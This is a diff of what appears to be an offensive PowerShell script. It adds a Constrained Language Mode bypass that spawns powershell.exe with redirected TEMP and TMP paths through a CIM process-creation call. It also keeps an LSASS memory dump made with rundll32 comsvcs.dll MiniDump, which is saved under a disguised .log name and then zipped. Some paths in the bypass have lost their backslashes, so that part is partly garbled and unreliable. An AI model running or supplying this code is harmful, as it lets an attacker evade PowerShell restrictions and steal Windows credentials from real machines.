@@ -12,14 +12,40 @@ $ExecutionContext.SessionState.LanguageMode
 
 If you get a 200 back you're all good.
 
-#lsass dump
-$processes = Get-Process
+CLM Bypass
+	#Path to Powershell
+	$CMDLine = "$PSHOMEpowershell.exe"
+
+	#Getting existing env vars
+	[String[]] $EnvVarsExceptTemp = Get-ChildItem Env:* -Exclude "TEMP","TMP"| % { "$($_.Name)=$($_.Value)" }
+
+	#Custom TEMP and TMP
+	$TEMPBypassPath = "Temp=C:windowstemp"
+	$TMPBypassPath = "TMP=C:windowstemp"
+
+	#Add the to the list of vars
+	$EnvVarsExceptTemp += $TEMPBypassPath
+	$EnvVarsExceptTemp += $TMPBypassPath
+
+	#Define the start params
+	$StartParamProperties = @{ EnvironmentVariables = $EnvVarsExceptTemp }
+	$StartParams = New-CimInstance -ClassName Win32_ProcessStartup -ClientOnly -Property $StartParamProperties
+
+	#Start a new powershell using the new params
+	Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{
+	CommandLine = $CMDLine
+	ProcessStartupInformation = $StartParams
+	}
+
+	#lsass dump
+	$processes = Get-Process
 	$location = Get-Location
 
-	$dumpid = foreach ($process in $processes){if ($process.ProcessName -eq "lsass"){$process.id}}
+
+$dumpid = foreach ($process in $processes){if ($process.ProcessName -eq "lsass"){$process.id}}
 		Write-Host "Found l s a s s process with ID $dumpid - starting dump with rundll32"
 		Write-Host "Dumpfile goes to Get-Location\$env:COMPUTERNAME.log"
-			rundll32 C:\Windows\System32\comsvcs.dll, MiniDump $dumpid $location\$env:COMPUTERNAME.log full | Out-Null
+		rundll32 C:\Windows\System32\comsvcs.dll, MiniDump $dumpid $location\$env:COMPUTERNAME.log full | Out-Null
 		Compress-Archive -Path $location\$env:COMPUTERNAME.log -DestinationPath $location\$env:COMPUTERNAME.zip -CompressionLevel NoCompression
 
 #ENABLE TLS1.2 if you receive a message Regarding an ISSUE with TLS   
